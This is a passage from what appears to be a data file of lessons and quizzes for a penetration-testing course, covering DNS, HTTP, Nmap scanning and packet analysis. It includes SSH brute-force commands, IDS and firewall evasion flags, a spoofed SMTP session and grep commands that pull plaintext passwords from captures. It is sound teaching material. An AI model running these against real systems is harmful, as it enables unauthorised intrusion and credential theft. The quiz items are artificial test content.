tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'
\`\`\`

> Understanding handshakes helps you scan stealthily.`,
              image: null,
            }
          ],
        },
        {
          id: 'room2',
          title: 'DNS, HTTP & Common Protocols',
          overview:
            "The web isn't just a collection of pages; it's a massive, interconnected network of protocols that were never built for security. In this room, you will learn to exploit the 'phonebook' of the internet (DNS) and the 'backbone' of the web (HTTP), uncovering the hidden paths and misconfigurations that lead to total system compromise.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'DNS - The Internet Phonebook',
              instruction: `DNS converts names to IP addresses.

**Simple example:**

\`\`\`
You type: google.com
DNS converts to: 142.250.185.46
Your browser connects to that IP
\`\`\`

**DNS lookup:**

\`\`\`bash
nslookup google.com     # Basic lookup
dig google.com          # Detailed lookup
host google.com         # Simple lookup
\`\`\`

**Why hackers care about DNS:**

**1. Find subdomains:**

\`\`\`bash
dig @8.8.8.8 target.com ANY
\`\`\`

**2. Discover mail servers:**

\`\`\`bash
dig target.com MX
\`\`\`

**3. Find all IPs:**

\`\`\`bash
dig target.com A
\`\`\`

**4. Reverse lookup:**

\`\`\`bash
dig -x 8.8.8.8      # Find domain from IP
\`\`\`

**DNS reconnaissance:**

\`\`\`bash
# Find nameservers
dig target.com NS

# Zone transfer (if misconfigured)
dig @ns1.target.com target.com AXFR
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p3r2-q1',
                  question: 'What does DNS do?',
                  options: ['Encrypts data', 'Converts domain names to IP addresses', 'Scans for vulnerabilities', 'Blocks hackers'],
                  correctIndex: 1,
                  explanation: 'DNS (Domain Name System) translates human-readable domain names like google.com into IP addresses like 142.250.185.46.'
                },
                {
                  id: 'p3r2-q1a',
                  question: "What does TCP do that UDP does not?",
                  options: [
                    "It encrypts everything it sends",
                    "It is always faster",
                    "It does not use port numbers",
                    "It confirms data arrived, resends lost data and keeps it in order"
                  ],
                  correctIndex: 3,
                  explanation: "TCP builds a connection and checks that everything arrives correctly, which is why web pages and email use it. UDP skips these checks to be quick. Neither one encrypts data on its own."
                },
                {
                  id: 'p3r2-q1b',
                  question: "A game server listens on UDP port 27015 only. A TCP scan shows port 27015 as closed. Why?",
                  options: [
                    "TCP and UDP ports are separate, so you must scan UDP to see it",
                    "The scan is broken",
                    "Closed means the server is turned off",
                    "The port is blocked for TCP and UDP the same way"
                  ],
                  correctIndex: 0,
                  explanation: "TCP port 27015 and UDP port 27015 are two different things. A TCP scan will never find a service that only listens on UDP, so testers check both."
                }
              ]
            },
            {
              title: 'HTTP Basics',
              instruction: `HTTP is how browsers talk to web servers.

**Request-Response:**

\`\`\`
Browser sends: GET /index.html HTTP/1.1
Server responds: HTML page
\`\`\`

**Common HTTP methods:**

\`\`\`
GET     - Retrieve data (most common)
POST    - Send data (login forms)
PUT     - Upload/update data
DELETE  - Remove data
\`\`\`

**HTTP status codes:**

\`\`\`
200 - OK (success)
301 - Redirect (moved permanently)
403 - Forbidden (no access)
404 - Not Found
500 - Server Error
\`\`\`

**View HTTP request:**

\`\`\`bash
curl -v http://target.com

# Output shows:
# > GET / HTTP/1.1        (request)
# < HTTP/1.1 200 OK       (response)
\`\`\`

**Common headers:**

\`\`\`bash
curl -I http://target.com

# Shows:
# Server: Apache/2.4.41
# X-Powered-By: PHP/7.4
# Set-Cookie: session=abc123
\`\`\`

> Headers leak information about the server!`,
              image: null,
            },
            {
              title: 'HTTPS and SSL/TLS',
              instruction: `HTTPS is encrypted HTTP.

**Difference:**

\`\`\`
HTTP:  Plaintext (anyone can read)
HTTPS: Encrypted (secure)
\`\`\`

**Check certificate:**

\`\`\`bash
openssl s_client -connect target.com:443

# Shows:
# Certificate info
# Encryption details
# Validity dates
\`\`\`

**Why hackers care:**

**1. Expired certificates:**

\`\`\`bash
# Check expiration
echo | openssl s_client -connect target.com:443 2>/dev/null | 
openssl x509 -noout -dates
\`\`\`

**2. Self-signed certificates:**

Browser warning = easier phishing attacks

**3. Weak encryption:**

\`\`\`bash
# Test SSL/TLS strength
nmap --script ssl-enum-ciphers -p 443 target.com
\`\`\`

**4. Certificate info reveals:**

- Real server location
- Organization details
- Subdomain names`,
              image: null,
              quiz: [
                {
                  id: 'p3r2-q2',
                  question: 'What is the main difference between HTTP and HTTPS?',
                  options: ['HTTPS is faster', 'HTTPS encrypts traffic', 'HTTP is newer', 'No difference'],
                  correctIndex: 1,
                  explanation: 'HTTPS uses SSL/TLS encryption to protect data in transit, while HTTP sends data in plaintext.'
                },
                {
                  id: 'p3r2-q2a',
                  question: "Which network is larger, 10.0.0.0/16 or 10.0.0.0/24?",
                  options: [
                    "/24, because 24 is bigger than 16",
                    "/16, because it has 65,536 addresses against 256",
                    "They are the same size",
                    "You cannot tell without scanning"
                  ],
                  correctIndex: 1,
                  explanation: "A smaller number after the slash means fewer network bits and more host addresses. So /16 is much bigger than /24. Scanning a /16 takes far longer, so check the size before you start."
                },
                {
                  id: 'p3r2-q2b',
                  question: "Which address is inside the network 192.168.1.0/24?",
                  options: [
                    "192.168.2.77",
                    "192.169.1.77",
                    "192.168.1.77",
                    "10.0.1.77"
                  ],
                  correctIndex: 2,
                  explanation: "A /24 fixes the first three numbers (192.168.1) and lets the last number change from 0 to 255. Only 192.168.1.77 matches. Reading CIDR this way tells you quickly if a host is in your scope."
                }
              ]
            },
            {
              title: 'FTP and SSH',
              instruction: `Protocols for file transfer and remote access.

**FTP (File Transfer Protocol):**

\`\`\`bash
ftp target.com          # Connect to FTP
# Login: anonymous / anonymous@
ls                      # List files
get file.txt            # Download
put file.txt            # Upload
\`\`\`

**Why FTP is insecure:**

\`\`\`
Credentials sent in plaintext!
Easy to intercept
\`\`\`

**Anonymous FTP:**

\`\`\`bash
# Check for anonymous access
nmap -p 21 --script ftp-anon target.com
\`\`\`

**SSH (Secure Shell):**

\`\`\`bash
ssh user@target.com         # Remote login
ssh -p 2222 user@target.com # Different port
\`\`\`

**SSH reconnaissance:**

\`\`\`bash
# Banner grabbing
nc target.com 22

# Output: SSH-2.0-OpenSSH_7.4
# Now you know the version!

# Brute force (with permission)
hydra -l admin -P passwords.txt ssh://target.com
\`\`\`

**SFTP (Secure FTP):**

\`\`\`bash
sftp user@target.com    # FTP over SSH (secure)
\`\`\``,
              image: null,
            },
            {
              title: 'SMTP and Email',
              instruction: `Email protocols and vulnerabilities.

**SMTP (Send mail):**

Port 25 (unencrypted) or 587 (encrypted)

**Test SMTP:**

\`\`\`bash
telnet target.com 25

# Manual email:
HELO attacker.com
MAIL FROM: sender@email.com
RCPT TO: victim@target.com
DATA
Subject: Test
This is a test email.
.
QUIT
\`\`\`

**Email reconnaissance:**

\`\`\`bash
# Find email addresses
theharvester -d target.com -b google

# Verify email exists
smtp-user-enum -M VRFY -U users.txt -t target.com
\`\`\`

**IMAP/POP3 (Read mail):**

\`\`\`
IMAP: Port 143 (or 993 encrypted)
POP3: Port 110 (or 995 encrypted)
\`\`\`

**Why hackers target email:**

- Password resets
- Social engineering
- Credential harvesting
- Phishing campaigns`,
              image: null,
              quiz: [
                {
                  id: 'p3r2-q3',
                  question: 'Why is FTP considered insecure?',
                  options: ['It is too slow', 'Credentials are sent in plaintext', 'It only works on old systems', 'It requires special software'],
                  correctIndex: 1,
                  explanation: 'FTP sends usernames and passwords unencrypted, making them easy to intercept. Use SFTP or FTPS instead.'
                },
                {
                  id: 'p3r2-q3a',
                  question: "You connect to a web server. Who sends the SYN-ACK?",
                  options: [
                    "Your computer",
                    "Your router",
                    "The DNS server",
                    "The server, in reply to your SYN"
                  ],
                  correctIndex: 3,
                  explanation: "The order is: you send SYN, the server answers SYN-ACK, then you send ACK. Only after all three steps is the connection ready for data."
                },
                {
                  id: 'p3r2-q3b',
                  question: "What is the idea behind a SYN flood attack?",
                  options: [
                    "Send many SYN packets and never finish the handshake, so the server fills up with half-open connections",
                    "Send huge files to fill the disk",
                    "Guess the server's password",
                    "Encrypt the server's data"
                  ],
                  correctIndex: 0,
                  explanation: "Each half-open connection takes up a small amount of the server's memory. With enough of them, the server cannot accept real users. This is why tools watch for unfinished handshakes."
                }
              ]
            },
            {
              title: 'Common Protocol Ports',
              instruction: `Memorize these port numbers - you'll use them constantly.

**Most important ports:**

\`\`\`
21   - FTP
22   - SSH
23   - Telnet (insecure, rarely used now)
25   - SMTP (email)
53   - DNS
80   - HTTP
110  - POP3 (email)
143  - IMAP (email)
443  - HTTPS
445  - SMB (Windows file sharing)
3306 - MySQL
3389 - RDP (Windows remote desktop)
5432 - PostgreSQL
8080 - HTTP alternate
8443 - HTTPS alternate
\`\`\`

**Quick scan for all:**

\`\`\`bash
nmap -p 21,22,23,25,53,80,443,445,3306,3389 target.com
\`\`\`

**Identify service versions:**

\`\`\`bash
nmap -sV -p 80,443 target.com

# Output:
# 80/tcp  open  http    Apache httpd 2.4.41
# 443/tcp open  https   Apache httpd 2.4.41
\`\`\`

**Why memorize ports:**

When you see port 3306 open, you immediately know:
- MySQL database
- Try default creds (root / root)
- Check for SQL injection
- Version vulnerabilities

> Knowing ports saves time during reconnaissance.`,
              image: null,
              quiz: [
                {
                  id: 'p3r2-q4',
                  question: 'Which port is used for HTTPS?',
                  options: ['80', '22', '443', '8080'],
                  correctIndex: 2,
                  explanation: 'Port 443 is the standard port for HTTPS (encrypted web traffic). Port 80 is for HTTP (unencrypted).'
                },
                {
                  id: 'p3r2-q4a',
                  question: "ping 8.8.8.8 works, but ping google.com fails. What is most likely broken?",
                  options: [
                    "Your network cable",
                    "DNS, which turns the name into an IP address",
                    "Your IP address",
                    "The Google server itself"
                  ],
                  correctIndex: 1,
                  explanation: "Pinging by IP works, so the network is fine. The name lookup is what fails. nslookup and dig let you test DNS directly."
                },
                {
                  id: 'p3r2-q4b',
                  question: "What does dig target.com MX tell you?",
                  options: [
                    "The admin passwords",
                    "The open ports",
                    "The mail servers for the domain",
                    "The web server version"
                  ],
                  correctIndex: 2,
                  explanation: "MX records list the servers that handle a domain's email. Testers use dig and nslookup to collect records like this about a target during reconnaissance."
                }
              ]
            }
          ],
        },
        {
          id: 'room3',
          title: 'Network Scanning & Enumeration',
          overview:
            "Enumeration is the most critical phase of any engagement. If you don't find it, you can't hack it. In this room, you will master Nmap from first principles, learning to bypass filters and map complex networks like a professional Qyvora operative.",
          estimatedMinutes: 40,
          steps: [
            {
              title: 'Introduction to Nmap',
              instruction: `Nmap is the most important network scanning tool.

**What Nmap does:**

- Finds live hosts
- Discovers open ports
- Identifies services
- Detects operating systems

**Basic scan:**

\`\`\`bash
nmap target.com
\`\`\`

**Scan specific ports:**

\`\`\`bash
nmap -p 80 target.com          # Single port
nmap -p 80,443 target.com      # Multiple ports
nmap -p 1-1000 target.com      # Port range
nmap -p- target.com            # All ports (slow!)
\`\`\`

**Scan subnet:**

\`\`\`bash
nmap 192.168.1.0/24            # Scan entire subnet
nmap 192.168.1.1-50            # Scan range
\`\`\`

**Why start with Nmap:**

Every hacking engagement begins with reconnaissance. Nmap finds:
- What's alive
- What ports are open
- What's running`,
              image: null,
              quiz: [
                {
                  id: 'p3r3-q1',
                  question: 'What does Nmap primarily do?',
                  options: ['Hack websites', 'Scan networks for live hosts and open ports', 'Encrypt traffic', 'Download files'],
                  correctIndex: 1,
                  explanation: 'Nmap is a network scanner that finds live hosts, open ports, and running services.'
                },
                {
                  id: 'p3r3-q1a',
                  question: "A page returns 403 Forbidden. What does that tell you?",
                  options: [
                    "The page does not exist",
                    "The server crashed",
                    "The page moved to a new address",
                    "The page exists, but the server refuses you access"
                  ],
                  correctIndex: 3,
                  explanation: "403 is different from 404. The server knows the page is there but says you are not allowed. A tester notes this and checks that access control is set up correctly."
                },
                {
                  id: 'p3r3-q1b',
                  question: "You send unusual input to a form and the server replies with 500 Internal Server Error. What does that suggest?",
                  options: [
                    "The server hit an error it did not handle, which may point to a bug worth investigating",
                    "The page is not found",
                    "Your request worked perfectly",
                    "You are blocked by the firewall"
                  ],
                  correctIndex: 0,
                  explanation: "500 means something went wrong inside the server. Unexpected input that causes errors is often a first sign of a weakness, so testers pay attention to these responses."
                }
              ]
            },
            {
              title: 'Scan Types',
              instruction: `Different scans for different situations.

**TCP SYN Scan (Stealth):**

\`\`\`bash
nmap -sS target.com

# Fast and stealthy
# Doesn't complete handshake
# Requires root/sudo
\`\`\`

**TCP Connect Scan:**

\`\`\`bash
nmap -sT target.com

# Completes full handshake
# Easier to detect
# Doesn't need root
\`\`\`

**UDP Scan:**

\`\`\`bash
nmap -sU target.com

# Very slow
# Finds DNS, SNMP, etc.
\`\`\`

**Ping Scan (No port scan):**

\`\`\`bash
nmap -sn 192.168.1.0/24

# Just find live hosts
# No port scanning
# Fast network discovery
\`\`\`

**Version Detection:**

\`\`\`bash
nmap -sV target.com

# Identifies service versions
# Example: Apache 2.4.41
\`\`\`

**OS Detection:**

\`\`\`bash
nmap -O target.com

# Guess operating system
# Example: Linux 3.x or Windows 10
\`\`\``,
              image: null,
            },
            {
              title: 'Timing and Performance',
              instruction: `Control scan speed and stealth.

**Timing templates:**

\`\`\`bash
nmap -T0 target.com    # Paranoid (super slow, stealthy)
nmap -T1 target.com    # Sneaky (slow)
nmap -T2 target.com    # Polite (slow)
nmap -T3 target.com    # Normal (default)
nmap -T4 target.com    # Aggressive (fast)
nmap -T5 target.com    # Insane (very fast)
\`\`\`

**When to use which:**

\`\`\`
T0-T2: Evading IDS/IPS systems
T3:    Normal scans
T4-T5: Fast scans (more likely to be detected)
\`\`\`

**Parallel scanning:**

\`\`\`bash
nmap --min-parallelism 100 target.com
# Scan many hosts simultaneously
\`\`\`

**Rate limiting:**

\`\`\`bash
nmap --max-rate 50 target.com
# Max 50 packets per second
\`\`\`

**Example scenarios:**

\`\`\`bash
# Quick scan
nmap -T4 -F target.com

# Stealth scan
nmap -T1 -sS target.com

# Comprehensive scan
nmap -T4 -A -v target.com
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p3r3-q2',
                  question: 'Which timing template is fastest but most likely to be detected?',
                  options: ['-T0', '-T2', '-T4', '-T5'],
                  correctIndex: 3,
                  explanation: '-T5 (insane) is the fastest but generates lots of traffic, making it easy to detect. Use for speed, not stealth.'
                },
                {
                  id: 'p3r3-q2a',
                  question: "What does a valid HTTPS certificate help prove?",
                  options: [
                    "That the website has no bugs",
                    "That the server really belongs to the domain you asked for, as vouched for by a trusted authority",
                    "That the website owner is honest",
                    "That your computer has no viruses"
                  ],
                  correctIndex: 1,
                  explanation: "A certificate ties a website's identity to its encryption key, and a trusted authority signs it. It proves who you are talking to, not that the site is safe."
                },
                {
                  id: 'p3r3-q2b',
                  question: "Your browser warns about a self-signed certificate. What is the reason?",
                  options: [
                    "The site is always malicious",
                    "The site does not use encryption",
                    "No trusted authority vouched for it, so the browser cannot confirm the site's identity",
                    "The site is offline"
                  ],
                  correctIndex: 2,
                  explanation: "A self-signed certificate was created by the owner themselves. It can still encrypt, but nobody trusted has checked it. That is fine for a test lab, and a red flag on a public website."
                }
              ]
            },
            {
              title: 'Nmap Scripts (NSE)',
              instruction: `Nmap has built-in scripts for advanced scanning.

**Run default scripts:**

\`\`\`bash
nmap -sC target.com
# Runs safe, common scripts
\`\`\`

**Specific script:**

\`\`\`bash
nmap --script http-title target.com
# Gets webpage titles

nmap --script ftp-anon target.com
# Checks for anonymous FTP

nmap --script ssh-brute target.com
# Brute force SSH
\`\`\`

**Multiple scripts:**

\`\`\`bash
nmap --script "http-*" target.com
# All HTTP scripts
\`\`\`

**Common useful scripts:**

\`\`\`bash
# Vulnerability scanning
nmap --script vuln target.com

# SMB enumeration
nmap --script smb-enum-shares target.com

# DNS zone transfer
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com
\`\`\`

**Find scripts:**

\`\`\`bash
ls /usr/share/nmap/scripts/ | grep -i "http"
\`\`\`

> NSE scripts automate many reconnaissance tasks!`,
              image: null,
            },
            {
              title: 'Output and Reporting',
              instruction: `Save scan results for later analysis.

**Normal output:**

\`\`\`bash
nmap target.com -oN scan.txt
# Human-readable format
\`\`\`

**XML output:**

\`\`\`bash
nmap target.com -oX scan.xml
# For tools to parse
\`\`\`

**Grepable output:**

\`\`\`bash
nmap target.com -oG scan.gnmap
# Easy to grep through
\`\`\`

**All formats:**

\`\`\`bash
nmap target.com -oA scan
# Creates scan.nmap, scan.xml, scan.gnmap
\`\`\`

**Parsing results:**

\`\`\`bash
# Find all open ports
grep "open" scan.gnmap

# Extract just IPs with port 80 open
grep "80/open" scan.gnmap | cut -d' ' -f2

# Count open ports
grep -c "open" scan.txt
\`\`\`

**Resume interrupted scan:**

\`\`\`bash
nmap --resume scan.gnmap
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p3r3-q3',
                  question: 'Why save Nmap output to a file?',
                  options: ['To make the scan faster', 'To analyze results later and generate reports', 'To hide the scan', 'To encrypt the data'],
                  correctIndex: 1,
                  explanation: 'Saving output lets you analyze results later, share with team members, and include in penetration test reports.'
                },
                {
                  id: 'p3r3-q3a',
                  question: "You need to upload files to a server securely. Which option is best?",
                  options: [
                    "FTP on port 21",
                    "An HTTP form with no HTTPS",
                    "Telnet",
                    "SFTP or SCP, which run over SSH"
                  ],
                  correctIndex: 3,
                  explanation: "SFTP and SCP use SSH, so passwords and files are encrypted on the way. FTP, Telnet and plain HTTP send data in readable form."
                },
                {
                  id: 'p3r3-q3b',
                  question: "Which change best protects an SSH server from password guessing?",
                  options: [
                    "Use key-based login and turn off password login",
                    "Use shorter passwords",
                    "Switch to FTP",
                    "Share the password only by email"
                  ],
                  correctIndex: 0,
                  explanation: "Attackers try thousands of passwords against SSH. Without password login there is nothing to guess. A long private key is far harder to break than any password."
                }
              ]
            },
            {
              title: 'Practical Scanning Strategies',
              instruction: `Real-world scanning approaches.

**Quick discovery scan:**

\`\`\`bash
# Find live hosts fast
nmap -sn 192.168.1.0/24 -oA live-hosts

# Then scan only live hosts
nmap -iL live-hosts.gnmap -p- -sV -oA full-scan
\`\`\`

**Comprehensive scan:**

\`\`\`bash
nmap -p- -sV -sC -A -T4 target.com -oA comprehensive

# -p-: All ports
# -sV: Version detection
# -sC: Default scripts
# -A: OS detection + traceroute
# -T4: Fast timing
\`\`\`

**Stealth scan:**

\`\`\`bash
nmap -sS -T1 -f --data-length 25 target.com

# -sS: SYN scan
# -T1: Slow timing
# -f: Fragment packets
# --data-length: Random packet size
\`\`\`

**Top ports only:**

\`\`\`bash
nmap --top-ports 100 target.com
# Scan 100 most common ports (fast)
\`\`\`

**Firewall evasion:**

\`\`\`bash
# Spoof source
nmap -D RND:10 target.com

# Custom source port
nmap --source-port 53 target.com

# Scan through proxy
proxychains nmap target.com
\`\`\`

> Always adapt your scan to the target environment!`,
              image: null,
              quiz: [
                {
                  id: 'p3r3-q4',
                  question: 'What is a benefit of running a quick ping scan before a full port scan?',
                  options: ['It makes the full scan unnecessary', 'It identifies live hosts so you only scan reachable targets', 'It hacks the systems', 'It encrypts your traffic'],
                  correctIndex: 1,
                  explanation: 'A ping scan (-sn) quickly identifies live hosts, then you can focus detailed port scans only on targets that are actually online, saving time.'
                },
                {
                  id: 'p3r3-q4a',
                  question: "Your mail app can read emails but cannot send any. Which protocol is most likely failing?",
                  options: [
                    "IMAP",
                    "SMTP, which is used for sending",
                    "POP3",
                    "DNS lookup only"
                  ],
                  correctIndex: 1,
                  explanation: "SMTP sends mail, while IMAP and POP3 are used to read it. Checking each in turn is how you find where an email problem sits."
                },
                {
                  id: 'p3r3-q4b',
                  question: "Why is email spoofing possible with basic SMTP?",
                  options: [
                    "Email is never encrypted by anyone",
                    "Only administrators can send email",
                    "SMTP on its own does not check that the From address is real",
                    "SMTP does not need a server"
                  ],
                  correctIndex: 2,
                  explanation: "Anyone can type any From address when talking to a mail server. This is why attackers can pretend to be your boss, and why protections such as SPF and DKIM were added."
                }
              ]
            }
          ],
        },
        {
          id: 'room4',
          title: 'Packet Analysis',
          overview:
            "A hacker who cannot read traffic is blind. Packet analysis is the art of seeing through the noise and identifying the exact data that flows through the Qyvora network. In this room, you will master Wireshark and Tshark, learning to extract credentials, analyze protocols, and reconstruct entire conversations from raw network captures.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'What is Packet Analysis?',
              instruction: `Reading network traffic to find useful information.

**What you can find:**

- Passwords sent in plaintext
- Unencrypted data
- Network patterns
- Malicious activity

**Tools:**

\`\`\`bash
Wireshark  # GUI tool (easiest to learn)
tcpdump    # Command-line (for servers)
tshark     # Wireshark's CLI version
\`\`\`

**Simple example:**

\`\`\`bash
# Capture traffic on interface eth0
tcpdump -i eth0

# Save to file
tcpdump -i eth0 -w capture.pcap

# Read file later
tcpdump -r capture.pcap
\`\`\`

**Why this matters:**

When analyzing a compromised network:
- See what was stolen
- Find attacker's IP
- Understand the attack`,
              image: null,
              quiz: [
                {
                  id: 'p3r4-q1',
                  question: 'What is the purpose of packet analysis?',
                  options: ['To make network faster', 'To read and analyze network traffic', 'To block all traffic', 'To encrypt data'],
                  correctIndex: 1,
                  explanation: 'Packet analysis (sniffing) captures and examines network traffic to find patterns, extract data, or detect malicious activity.'
                },
                {
                  id: 'p3r4-q1a',
                  question: "An outside scan shows port 3306 open to the internet. What is it, and why is it a concern?",
                  options: [
                    "SSH, because it uses a weak password",
                    "DNS, because it is slow",
                    "HTTP, because it has no encryption",
                    "MySQL, because databases should normally not be reachable from the internet"
                  ],
                  correctIndex: 3,
                  explanation: "3306 is MySQL. A database holds the most valuable data, so exposing it lets attackers try to guess passwords or use known flaws. Database ports should usually be open only to the application server."
                },
                {
                  id: 'p3r4-q1b',
                  question: "Which pairing of port and service is correct?",
                  options: [
                    "22 = SSH",
                    "25 = DNS",
                    "80 = HTTPS",
                    "21 = SMTP"
                  ],
                  correctIndex: 0,
                  explanation: "The right pairs are 21 = FTP, 22 = SSH, 25 = SMTP, 53 = DNS, 80 = HTTP and 443 = HTTPS. Knowing them lets you guess what a service is when you see a port number in a scan."
                }
              ]
            },
            {
              title: 'Capturing Traffic',
              instruction: `How to capture network packets.

**Using tcpdump:**

\`\`\`bash
# Capture on eth0
sudo tcpdump -i eth0

# Capture specific protocol
sudo tcpdump -i eth0 tcp

# Capture specific port
sudo tcpdump -i eth0 port 80

# Capture and save
sudo tcpdump -i eth0 -w http-traffic.pcap port 80
\`\`\`

**Using tshark:**

\`\`\`bash
# Capture 100 packets
tshark -c 100

# Capture HTTP only
tshark -f "tcp port 80"

# Save to file
tshark -w capture.pcap
\`\`\`

**Capture filters:**

\`\`\`bash
# Specific host
tcpdump host 192.168.1.100

# Specific network
tcpdump net 192.168.1.0/24

# Source or destination
tcpdump src 192.168.1.1
tcpdump dst 192.168.1.100
\`\`\`

**Combine filters:**

\`\`\`bash
# HTTP from specific host
tcpdump src 192.168.1.100 and port 80
\`\`\``,
              image: null,
            },
            {
              title: 'Reading Packets',
              instruction: `Analyze captured traffic.

**Open in Wireshark:**

\`\`\`bash
wireshark capture.pcap
\`\`\`

**Read with tcpdump:**

\`\`\`bash
# Read file
tcpdump -r capture.pcap

# With ASCII output
tcpdump -A -r capture.pcap

# Hexadecimal output
tcpdump -X -r capture.pcap
\`\`\`

**Filter while reading:**

\`\`\`bash
# Show only HTTP
tcpdump -r capture.pcap port 80

# Show only specific IP
tcpdump -r capture.pcap host 192.168.1.100
\`\`\`

**Extract useful info:**

\`\`\`bash
# Get all GET requests
tcpdump -A -r capture.pcap port 80 | grep "GET"

# Find POST data (possible passwords)
tcpdump -A -r capture.pcap port 80 | grep -i "password"
\`\`\``,
              image: null,
              quiz: [
                {
                  id: 'p3r4-q2',
                  question: 'What does the -A flag do in tcpdump?',
                  options: ['Saves automatically', 'Shows packet content in ASCII (readable text)', 'Speeds up capture', 'Encrypts output'],
                  correctIndex: 1,
                  explanation: 'The -A flag displays packet payload in ASCII, making text data like passwords or web content readable.'
                },
                {
                  id: 'p3r4-q2a',
                  question: "What does nmap -p 80,443 target do?",
                  options: [
                    "Scans all ports except 80 and 443",
                    "Scans only ports 80 and 443 on the target",
                    "Blocks ports 80 and 443",
                    "Downloads the web pages"
                  ],
                  correctIndex: 1,
                  explanation: "The -p option picks which ports to scan. Scanning only the ports you care about is much faster. Only scan targets you have permission to test."
                },
                {
                  id: 'p3r4-q2b',
                  question: "nmap shows port 25 as filtered. What does that usually mean?",
                  options: [
                    "The port is open",
                    "The port is closed and nothing listens",
                    "A firewall is blocking the probes, so nmap cannot tell if it is open",
                    "The port is encrypted"
                  ],
                  correctIndex: 2,
                  explanation: "Open means a service answered and closed means the machine said nothing is there. Filtered means no clear answer came back, often because a firewall dropped the packets."
                }
              ]
            },
            {
              title: 'Finding Credentials',
              instruction: `Extract passwords from captured traffic.

**HTTP Basic Auth:**

\`\`\`bash
# Find Basic Auth headers
tcpdump -A -r capture.pcap | grep "Authorization: Basic"

# Decode Base64
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# Output: admin:password
\`\`\`

**FTP Credentials:**

\`\`\`bash
# FTP sends credentials in plaintext!
tcpdump -A -r capture.pcap port 21 | grep -E "USER|PASS"

# Output:
# USER admin
# PASS secretpassword
\`\`\`

**Telnet (also plaintext):**

\`\`\`bash
tcpdump -A -r capture.pcap port 23
# Everything visible: username, password, commands
\`\`\`

**POST form data:**

\`\`\`bash
# Web forms often send passwords via POST
tcpdump -A -r capture.pcap port 80 | grep -i "password="
\`\`\`

**Why unencrypted protocols are dangerous:**

\`\`\`
HTTP, FTP, Telnet = Everything visible
HTTPS, SFTP, SSH = Encrypted (safe)
\`\`\`

> Always use encrypted protocols for sensitive data!`,
              image: null,
            },
            {
              title: 'Protocol Analysis',
              instruction: `Understand different protocol patterns.

**DNS queries:**

\`\`\`bash
# See what domains are being looked up
tcpdump -r capture.pcap port 53

# Find DNS queries only
tcpdump -r capture.pcap "udp port 53"
\`\`\`

**TCP handshakes:**

\`\`\`bash
# See SYN packets (connection attempts)
tcpdump -r capture.pcap 'tcp[tcpflags] & (tcp-syn) != 0'

# See SYN-ACK (successful connections)
tcpdump -r capture.pcap 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'
\`\`\`

**Suspicious patterns:**

\`\`\`bash
# Large number of SYN packets = port scan
tcpdump -r capture.pcap 'tcp[tcpflags] & (tcp-syn) != 0' | wc -l

# Many different destination ports = scanning
tcpdump -r capture.pcap dst host target.com | 
  cut -d' ' -f5 | cut -d'.' -f5 | sort -u
\`\`\`

**Follow TCP stream in Wireshark:**

Right-click packet → Follow → TCP Stream

Shows entire conversation between two hosts.`,
              image: null,
              quiz: [
                {
                  id: 'p3r4-q3',
                  question: 'Why are HTTP, FTP, and Telnet dangerous?',
                  options: ['They are too slow', 'They send data in plaintext without encryption', 'They are outdated', 'They require passwords'],
                  correctIndex: 1,
                  explanation: 'These protocols send data unencrypted, making credentials and sensitive information visible to anyone capturing traffic.'
                },
                {
                  id: 'p3r4-q3a',
                  question: "You want to find which hosts on a network are alive, without scanning their ports. Which option do you use?",
                  options: [
                    "-sS",
                    "-sU",
                    "-sT",
                    "-sn"
                  ],
                  correctIndex: 3,
                  explanation: "-sn is a ping scan: it only checks which hosts respond. It is a quick first step before deeper scans on the machines that are up."
                },
                {
                  id: 'p3r4-q3b',
                  question: "Why does nmap -sS usually need sudo or root?",
                  options: [
                    "It builds raw packets by hand, which needs administrator rights",
                    "It scans UDP ports",
                    "It deletes logs on the target",
                    "It only works on Kali"
                  ],
                  correctIndex: 0,
                  explanation: "The SYN scan sends custom packets instead of normal connections. Without admin rights nmap falls back to the connect scan (-sT)."
                }
              ]
            },
            {
              title: 'Practical Analysis',
              instruction: `Real-world packet analysis scenarios.

**Scenario 1: Find attacker's IP**

\`\`\`bash
# Look for unusual traffic patterns
tcpdump -r breach.pcap | awk '{print $3}' | sort | uniq -c | sort -rn
# High packet count from one IP = suspicious
\`\`\`

**Scenario 2: Extract file transfers**

\`\`\`bash
# Find HTTP file downloads
tcpdump -A -r capture.pcap port 80 | grep -E "GET|POST"

# Follow the stream in Wireshark
# File → Export Objects → HTTP
\`\`\`

**Scenario 3: Detect port scan**

\`\`\`bash
# Many SYN packets to different ports
tcpdump -r capture.pcap 'tcp[tcpflags] == tcp-syn' | 
  awk '{print $5}' | cut -d'.' -f5 | sort -u | wc -l
# High number = port scan
\`\`\`

**Scenario 4: Find DNS tunneling**

\`\`\`bash
# Unusually long DNS queries = data exfiltration
tcpdump -r capture.pcap port 53 | grep -E ".{50,}"
\`\`\`

**Export data from Wireshark:**

\`\`\`
File → Export Objects → HTTP/SMB/etc
Statistics → Protocol Hierarchy
Statistics → Conversations
\`\`\`

> Packet analysis reveals what really happened on the network.`,
              image: null,
              quiz: [
                {
                  id: 'p3r4-q4',
                  question: 'What might many SYN packets to different ports indicate?',
                  options: ['Normal traffic', 'A port scan or network reconnaissance', 'Encrypted communication', 'File transfer'],
                  correctIndex: 1,
                  explanation: 'Many SYN packets to different ports is the signature of a port scan - someone is probing which ports are open.'
                },
                {
                  id: 'p3r4-q4a',
                  question: "You want a slow, quiet scan to avoid setting off an intrusion detection system. Which option is the best fit?",
                  options: [
                    "-T5",
                    "-T1",
                    "-T4",
                    "-T3"
                  ],
                  correctIndex: 1,
                  explanation: "Timing goes from T0 (slowest) to T5 (fastest). Slow templates send packets with long pauses, which is harder to notice. T3 is the default."
                },
                {
                  id: 'p3r4-q4b',
                  question: "Why should you be careful about using -T5 on a real client network?",
                  options: [
                    "It makes the scan more accurate",
                    "It is required for every scan",
                    "Very fast scans can overload fragile devices, miss results and are easy to detect",
                    "It hides your IP address"
                  ],
                  correctIndex: 2,
                  explanation: "A scan that is too fast can slow or even crash weak equipment like old routers and printers. Causing damage goes against the do-no-harm rule, so pick speed to match the network."
                }
              ]
            }
          ],
        }],
    },

